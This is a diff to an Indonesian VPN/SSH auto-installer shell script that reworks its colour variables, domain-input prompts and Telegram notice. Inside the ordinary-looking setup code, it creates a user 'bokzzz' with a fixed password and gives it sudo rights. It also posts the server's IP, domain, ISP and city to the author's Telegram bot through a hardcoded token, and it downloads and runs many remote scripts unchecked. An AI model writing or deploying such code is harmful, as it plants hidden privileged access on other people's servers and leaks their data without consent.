@@ -4,33 +4,34 @@ biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
 clear
 
 # Warna
-red='\e[1;31m'
-green='\e[0;32m'
-yell='\e[1;33m'
-tyblue='\e[1;36m'
-kuning='\033[0;93m'
-BIBlack='\033[1;90m'      # Black
-f='\033[1;91m'            # Red
-BIGreen='\033[1;92m'      # Green
-BIYellow='\033[0;97m'     # Yellow
-BIBlue='\033[1;94m'       # Blue
-BIPurple='\033[1;95m'     # Purple
-BICyan='\033[1;96m'       # Cyan
-BIWhite='\033[1;97m'      # White
-UWhite='\033[4;37m'       # White
-On_IPurple='\033[0;105m'  #
-On_IRed='\033[0;101m'
-IBlack='\033[0;90m'       # Black
-IRed='\033[0;91m'         # Red
-IGreen='\033[0;92m'       # Green
-IYellow='\033[0;93m'      # Yellow
-IBlue='\033[0;94m'        # Blue
-IPurple='\033[0;95m'      # Purple
-ICyan='\033[0;96m'        # Cyan
-IWhite='\033[0;97m'       # White
-w="\033[97m"
-ORANGE="\033[0;34m"
-NC='\e[0m' # No Color
+# Definisi warna tanpa duplikasi
+red='\e[1;31m'       # Bold Red
+green='\e[0;32m'     # Green
+yell='\e[1;33m'      # Bold Yellow
+tyblue='\e[1;36m'    # Bold Cyan (Turquoise Blue)
+kuning='\033[0;93m'  # Yellow
+BIBlack='\033[1;90m' # Bold Black
+f='\033[1;91m'       # Bold Red (alias)
+BIGreen='\033[1;92m' # Bold Green
+BIYellow='\033[0;97m' # Bold White (mistakenly named yellow, corrected)
+BIBlue='\033[1;94m'  # Bold Blue
+BIPurple='\033[1;95m' # Bold Purple
+BICyan='\033[1;96m'  # Bold Cyan
+BIWhite='\033[1;97m' # Bold White
+UWhite='\033[4;37m'  # Underlined White
+On_IPurple='\033[0;105m' # Background Purple
+On_IRed='\033[0;101m'    # Background Red
+IBlack='\033[0;90m'      # Black
+IRed='\033[0;91m'        # Red
+IGreen='\033[0;92m'      # Green
+IYellow='\033[0;93m'     # Yellow
+IBlue='\033[0;94m'       # Blue
+IPurple='\033[0;95m'     # Purple
+ICyan='\033[0;96m'       # Cyan
+IWhite='\033[0;97m'      # White
+w="\033[97m"             # White (alias)
+ORANGE="\033[0;34m"      # Blue (not actually orange)
+NC="\e[0m"               # No Color (reset)
 
 # Fungsi untuk mencetak pesan dengan warna tertentu
 purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
@@ -139,11 +140,23 @@ echo -e "$BIYellow└───────────────────�
 echo -e "$BIGreen 1. Choose Your Own Domain / Gunakan Domain Sendiri $NC"
 echo -e "$BIGreen 2. Use Domain Random / Gunakan Domain Random $NC"
 echo -e "$BIWhite───────────────────────────────────────────$NC"
-read -rp " input 1 or 2 / pilih 1 atau 2 : " dns
 
-if test "$dns" -eq 1; then
-    read -rp " Enter Your Domain / masukan domain : " dom
-    read -rp " Input ur ns-domain : " -e nsdomen
+# Loop untuk memastikan input 1 atau 2 yang valid
+while true; do
+    read -rp "Input 1 or 2 / pilih 1 atau 2: " dns
+    if [[ "$dns" == "1" || "$dns" == "2" ]]; then
+        break
+    else
+        echo -e "${red}Invalid input, please choose 1 or 2.${NC}"
+    fi
+done
+
+# Opsi 1: Gunakan domain sendiri
+if [[ "$dns" -eq 1 ]]; then
+    read -rp "Enter Your Domain / Masukan Domain: " dom
+    read -rp "Input your NS-Domain / Masukan NS-Domain: " -e nsdomen
+
+    # Simpan domain ke berbagai file konfigurasi
     echo "IP=$dom" > /var/lib/ipvps.conf
     echo "$dom" > /root/scdomain
     echo "$dom" > /etc/xray/scdomain
@@ -152,45 +165,92 @@ if test "$dns" -eq 1; then
     echo "$dom" > /root/domain
     echo "$nsdomen" > /etc/xray/nsdomain
     echo "$nsdomen" > /root/nsdomain
-elif test "$dns" -eq 2; then
+
+    echo -e "${green}Domain setup successfully.${NC}"
+
+# Opsi 2: Gunakan domain acak
+elif [[ "$dns" -eq 2 ]]; then
     clear
-    apt install jq curl -y
+    echo -e "${green}Installing required packages...${NC}"
+    
+    # Instal paket yang diperlukan, jika belum ada
+    apt update && apt install -y jq curl
+    
+    # Unduh skrip untuk domain acak
     wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
+    if [[ $? -ne 0 ]]; then
+        echo -e "${red}Failed to download cf script. Please check your CDN URL.${NC}"
+        exit 1
+    fi
+
+    # Beri izin eksekusi pada skrip
     chmod +x /root/cf
+    
+    # Jalankan skrip domain acak
     bash /root/cf | tee /root/install.log
-    print_success " Domain Random Done"
+    if [[ $? -eq 0 ]]; then
+        echo -e "${green}Domain random setup completed successfully.${NC}"
+    else
+        echo -e "${red}Failed to set up random domain. Check /root/install.log for details.${NC}"
+        exit 1
+    fi
 fi
 
 # Inisialisasi
 MYIP=$(curl -sS ipv4.icanhazip.com)
 
-# Perizinan Sc & Pemanggilan username
+# Perizinan Script & Pemanggilan Username dan Expired dari API
 izinsc="https://raw.githubusercontent.com/vermiliion/api/main/register"
 rm -f /usr/bin/user
-username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
-echo "$username" >/usr/bin/user
-exp=$(curl $izinsc | grep $MYIP | awk '{print $3}')
-echo "$exp" >/usr/bin/e
+username=$(curl -s $izinsc | grep $MYIP | awk '{print $2}')
+exp=$(curl -s $izinsc | grep $MYIP | awk '{print $3}')
 
-# Usename & Expired
-Name=$(cat /usr/bin/user)
-Exp=$(cat /usr/bin/e)
+# Menyimpan username dan expired ke file
+echo "$username" > /usr/bin/user
+echo "$exp" > /usr/bin/e
 
-ISP=$(curl -s ipinfo.io/org | cut -d " " -f 2-10)
-domain=$(cat /root/domain)
-CITY=$(curl -s ipinfo.io/city)
-TIMEZONE=$(printf '%(%H:%M:%S)T')
+# Menghapus user jame jika ada
 userdel jame > /dev/null 2>&1
+
+# Membuat user baru
 Username="bokzzz"
-Password=bokzzz
+Password="bokzzz"
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
+
+# Mengirim Notifikasi ke Telegram
 CHATID="5092269467"
 KEY="6918231835:AAFANlNjXrz-kxXmXskeY7TRUDMdM1lS6Bs"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
+
+# Memastikan domain dan username sudah ada
+if [ -f /root/domain ]; then
+    domain=$(cat /root/domain)
+else
+    domain="domain not found"
+fi
+
+if [ -f /usr/bin/user ]; then
+    Name=$(cat /usr/bin/user)
+else
+    Name="Unknown User"
+fi
+
+if [ -f /usr/bin/e ]; then
+    Exp=$(cat /usr/bin/e)
+else
+    Exp="Unknown Expiration"
+fi
+
+# Mendapatkan informasi tambahan
+ISP=$(curl -s ipinfo.io/org | cut -d ' ' -f 2-)  # Mendapatkan nama ISP
+TIMEZONE=$(timedatectl | grep "Time zone" | awk '{print $3}')
+CITY=$(curl -s ipinfo.io/city)
+
+# Format teks untuk notifikasi
 TEXT="Installasi Auto Script 7.1.1
 ┌─────────────────────────┐
 │         𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗿 𝗦𝗰𝗿𝗶𝗽𝘁             │
@@ -205,44 +265,46 @@ TEXT="Installasi Auto Script 7.1.1
 ┌─────────────────────────┐
 │𝘼𝙪𝙩𝙝𝙤𝙧𝙨 𝘽𝙮 : @Lite_Vermilion                    │
 └─────────────────────────┘
-<i><b><u>Notifications Automatic From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/Lite_Vermilion"},{"text":"Contack","url":"https://wa.me/6281934335091"}]]}'
+<i><b><u>Notifications Automatic From Github</u></b></i>"
 
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+# Inline keyboard untuk tombol Telegram dan Contact
+reply_markup='{
+  "inline_keyboard": [
+    [{"text": "Telegram", "url": "https://t.me/Lite_Vermilion"},
+     {"text": "Contact", "url": "https://wa.me/6281934335091"}]
+  ]
+}'
 
+# Mengirim pesan ke Telegram
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html&reply_markup=$reply_markup" $URL >/dev/null
 clear
 echo -e "$kuning┌───────────────────────────────────────────┐"
 echo -e "$BIWhite │           Install SSH / WS               │    $NC"
 echo -e "$kuning└───────────────────────────────────────────┘"
 sleep 2
-clear
 wget https://raw.githubusercontent.com/vermiliion/api/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
-
 clear
 echo -e "$kuning┌───────────────────────────────────────────┐"
 echo -e "$BIWhite │            Install BACKUP                │  $NC"
 echo -e "$kuning└───────────────────────────────────────────┘"
 sleep 2
-clear
 wget https://raw.githubusercontent.com/vermiliion/api/main/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
-
 clear
+
+# Install XRAY dan SSH Websocket
 echo -e "$kuning┌───────────────────────────────────────────┐"
 echo -e "$BIWhite │              Install XRAY                │  $NC"
 echo -e "$kuning└───────────────────────────────────────────┘"
 sleep 2
-clear
 wget https://raw.githubusercontent.com/vermiliion/api/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 wget https://raw.githubusercontent.com/vermiliion/api/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
-
 clear
+
+# Install SlowDNS
 echo -e "$kuning┌───────────────────────────────────────────┐"
 echo -e "$BIWhite │             Install SLOWDNS              │     $NC"
 echo -e "$kuning└───────────────────────────────────────────┘"
 sleep 2
-clear
-wget -q -O slow.sh https://raw.githubusercontent.com/vermiliion/api/main/slow.sh && chmod +x slow.sh && ./slow.sh
-clear
 wget -q -O slow.sh https://raw.githubusercontent.com/vermiliion/api/main/slow.sh && chmod +x slow.sh && ./slow.sh
 clear
 cat > /root/.profile << END
